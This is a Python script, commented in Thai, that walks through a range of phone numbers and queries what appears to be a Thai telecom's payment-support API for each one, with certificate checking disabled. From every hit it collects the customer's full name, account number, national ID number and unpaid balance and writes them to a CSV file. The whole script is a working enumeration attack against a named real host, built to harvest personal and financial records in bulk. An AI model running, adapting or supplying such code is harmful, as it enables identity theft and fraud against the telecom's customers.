
import requests
import uuid
import time
import csv

def generate_uuid():
    return str(uuid.uuid4())

def get_customer_data(serviceid):
    trans_id = generate_uuid()
    data = {
        'trans_id': trans_id,
        'serviceid': serviceid
    }

    url = 'https://pym-support.ntplc.co.th:3000/qr/serviceid'
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    try:
        response = requests.post(url, json=data, headers=headers, verify=False)  # ปิดการตรวจสอบ SSL
        response.raise_for_status()  # ตรวจสอบข้อผิดพลาด HTTP

        result = response.json()

        if result.get('success') == "TRUE":
            print("ผลลัพธ์การตรวจสอบ:")
            print(f"หมายเลขโทรศัพท์: {result['service_id']}")
            print(f"ชื่อบัญชีลูกค้า: {result['full_customer_name']}")
            print(f"หมายเลขบัญชี: {result['account_number']}")
            personal_id = result.get('personal_id', "ไม่ระบุ")
            print(f"หมายเลขประจำตัวประชาชน: {personal_id}")

            if 'invoicelist' in result and len(result['invoicelist']) > 0:
                print(f"ยอดค้างชำระ: {result['invoicelist'][0]['outstanding_amount']} บาท")
                print(f"วันที่ครบกำหนดชำระ: {result['invoicelist'][0]['due_date']}")
            else:
                print("ไม่มีข้อมูลใบแจ้งหนี้")

            # เขียนข้อมูลลงไฟล์ CSV
            write_to_csv(result)

        else:
            print(f"ไม่พบข้อมูลสำหรับหมายเลขโทรศัพท์: {serviceid}")

    except requests.exceptions.RequestException as e:
        print(f"เกิดข้อผิดพลาดในการเรียก API: {e}")

def write_to_csv(data, filename='customer_data.csv'):
    """
    เขียนข้อมูลลงไฟล์ CSV

    Args:
        data: ข้อมูลที่จะเขียน (dictionary)
        filename: ชื่อไฟล์ CSV (default: 'customer_data.csv')
    """
    fieldnames = data.keys()  # ใช้ keys ของ data เป็น header ของ CSV

    with open(filename, 'a', newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        # เขียน header เฉพาะครั้งแรกที่เปิดไฟล์
        if csvfile.tell() == 0:
            writer.writeheader()

        writer.writerow(data)

# วนลูปสำหรับ serviceid range ที่กำหนด
for serviceid_int in range(55335500, 55335599 + 1):
    serviceid = f"0{serviceid_int}"
    get_customer_data(serviceid)
    time.sleep(3)